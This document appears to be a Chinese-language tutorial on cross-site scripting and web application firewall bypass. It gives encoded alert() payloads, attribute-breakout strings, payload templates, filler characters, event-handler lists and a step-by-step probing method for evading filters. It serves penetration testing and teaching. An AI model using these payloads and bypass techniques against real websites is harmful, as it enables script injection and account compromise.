# xss 攻击和绕过思路

## 什么样的api可能存在xss 漏洞
输入参数如果能回显则可能存在xss 漏洞

存在xss 的位置可能是
* html 内容
* html 属性
* css 内联样式
* 内联js或者json
* href 等

常见的是html 内容和属性
```
<input> html 内容 </input>

<input> html 内容 </input value=""// html 属性>

```

## html编码，url 编码 和js 编码

html 的解析顺序为3个环节：HTML解码 -->URL解码 -->JS解码

举例1：
```
1. 对javascript:alert(1)进行HTML编码
<img src=xxx onerror="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
2. 对alert进行JS编码
<img src=xxx onerror="javascript:\u0061\u006c\u0065\u0072\u0074(1)">
3. 以上两种方法混用
<img src=xxx onerror="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;&#x28;&#x31;&#x29;">

```
举例2：
```
1. 原代码
<a href="javascript:alert('xss')">test</a>
2. 对alert进行JS编码（unicode编码）
<a href="javascript:\u0061\u006c\u0065\u0072\u0074('xss')">test</a>
3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码
<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34('xss')">test</a>
4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34('xss')进行HTML编码：
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;">test</a>

```

## 攻击顺序
1. 判断是否存在字符串编码
输入<script>alert("1")</script>, 看是否转成html 实体，可以判断是否使用html实体转换。
  
2. 是否存在waf
一般waf 返回403，如果发现403，则存在waf拦截。

## waf 绕过
### 1. xss输出在html内容

一般payload 格式有下面几种
```
<{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{>,//,Space,Tab,LF}
```

```
<sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{>,//,Space,Tab,LF}
```

```
<A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{>,//,Space,Tab,LF}
```

**{tag}**：html 标签名： a img script 等等

**{filter}**：空格，/ 等，可以是url 编码的字符
```
<tag xxx – 如果失败，{space}
<tag%09xxx – 如果失败，[s] tab
<tag%09%09xxx -如果失败， s+ tabtab
<tag/xxx – 如果失败，[s/]+
<tag%0axxx-如果失败， [sn]+
<tag%0dxxx>-如果失败， [snr+]+
<tag/~/xxx – 如果失败， .*+
```
**event_handler** 可能是多个even 函数:
```
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
```
**{javascript}**: js代码
js 代码可以混淆，可以js编码成unicode，可以使用html实体编码，几乎没法正则表达式绕过


### 2. xss输出在html 属性
常见的payload 格式：
```
{quote}{filler}{event_handler}{?filler}={?filler}{javascript}
```

## html 编码绕过
html 一般会过滤掉< > " &, 所以输出在html 内容位置的xss 可以用10紧致html实体闭合，输出在html 属性的payload 通过换编码，混淆等有很多绕过方式。
一般payload 以下格式
```
{quote}{filler}{event_handler}{?filler}={?filler}{javascript}
```
举例：
```
" onclick="alert('xss')"
```
## payload 构造试探
```
// 判断是否存在htmlspecialchars
<script>alert("1")</script>

// 判断是否filter格式
<tag xxx – 如果失败，{space}
<tag%09xxx – 如果失败，[s]
<tag%09%09xxx -如果失败， s+
<tag/xxx – 如果失败，[s/]+
<tag%0axxx-如果失败， [sn]+
<tag%0dxxx>-如果失败， [snr+]+
<tag/~/xxx – 如果失败， .*+

//判断event_handler是否黑名单格式
<tag{filler}onxxx – 如果失败，onw+.
如果通过， on(load|click|error|show)
<tag{filler}onclick – 如果通过，则没有事件处理程序检查正则表达式。

//构造js payload
```
